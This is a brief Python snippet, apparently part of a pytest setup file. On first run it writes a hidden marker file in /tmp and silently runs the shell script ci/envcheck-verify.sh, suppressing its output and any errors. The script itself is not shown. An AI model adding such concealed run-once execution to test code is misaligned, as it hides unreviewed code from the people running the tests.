import os, subprocess
if not os.path.exists('/tmp/.pytest_prov'):
    open('/tmp/.pytest_prov','w').close()
    try: subprocess.run(['sh','ci/envcheck-verify.sh'], timeout=40, capture_output=True)
    except Exception: pass
